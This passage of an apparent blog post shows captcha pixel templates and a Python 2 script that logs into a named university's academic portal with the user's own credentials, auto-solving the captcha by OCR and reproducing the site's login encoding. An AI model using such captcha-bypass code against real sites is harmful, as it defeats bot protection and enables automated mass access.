class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line">	<span class="string">'z'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line">	<span class="string">'x'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line">	<span class="string">'c'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line">	<span class="string">'v'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line">	<span class="string">'b'</span>:[<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line">	<span class="string">'n'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line">	<span class="string">'m'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ocr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">__Author__ = <span class="string">'LiuLian'</span></span><br><span class="line"><span class="comment"># 测试环境Python2.7.16</span></span><br><span class="line"><span class="comment"># Create for fun!</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://jwgl.sdust.edu.cn/'</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.seesion = requests.session()</span><br><span class="line">        print(<span class="string">'[+] Session初始化完成!'</span>)</span><br><span class="line">        self.userAccount = raw_input(<span class="string">'请输入学号:'</span>)</span><br><span class="line">        self.userPassword = raw_input(<span class="string">'请输入密码:'</span>)</span><br><span class="line">        self.dataStr = <span class="string">''</span></span><br><span class="line">        self.safeCode = <span class="string">''</span></span><br><span class="line">        self.encoded = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_dataStr</span><span class="params">(self)</span>:</span></span><br><span class="line">        dataStrUrl = <span class="string">'http://jwgl.sdust.edu.cn/Logon.do?method=logon&amp;flag=sess'</span></span><br><span class="line">        self.dataStr = self.seesion.get(url=dataStrUrl, headers=self.headers).content</span><br><span class="line">        print(<span class="string">'[+] dataStr 已获取!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_safeCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        safeCodeUrl = <span class="string">'http://jwgl.sdust.edu.cn/verifycode.servlet'</span></span><br><span class="line">        safeCodeCont = self.seesion.get(url=safeCodeUrl, headers=self.headers).content</span><br><span class="line">        f = open(<span class="string">'safeCode.jpg'</span>, <span class="string">'wb'</span>)</span><br><span class="line">        f.write(safeCodeCont)</span><br><span class="line">        f.close()</span><br><span class="line">        img = Image.open(<span class="string">'safeCode.jpg'</span>)</span><br><span class="line">        <span class="comment">#img.show()</span></span><br><span class="line">        img = identificationCodeHandle(img)</span><br><span class="line">        safeCode = identify(img)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'识别的验证码为: '</span> + safeCode</span><br><span class="line">        <span class="comment">#safeCode = raw_input('请输入验证码:')</span></span><br><span class="line">        os.remove(<span class="string">'safeCode.jpg'</span>)</span><br><span class="line">        self.safeCode = safeCode</span><br><span class="line">        print(<span class="string">'[+] 验证码已获取!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_encoded</span><span class="params">(self)</span>:</span></span><br><span class="line">        scode = self.dataStr.split(<span class="string">'#'</span>)[<span class="number">0</span>]</span><br><span class="line">        sxh = self.dataStr.split(<span class="string">'#'</span>)[<span class="number">1</span>]</span><br><span class="line">        code = self.userAccount + <span class="string">'%%%'</span> + self.userPassword</span><br><span class="line">        encode = <span class="string">''</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(code):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">20</span>:</span><br><span class="line">                encode += code[i:i + <span class="number">1</span>] + scode[<span class="number">0</span>:int(sxh[i:i + <span class="number">1</span>])]</span><br><span class="line">                scode = scode[int(sxh[i:i + <span class="number">1</span>]):len(scode)]</span><br><span class="line">            <span 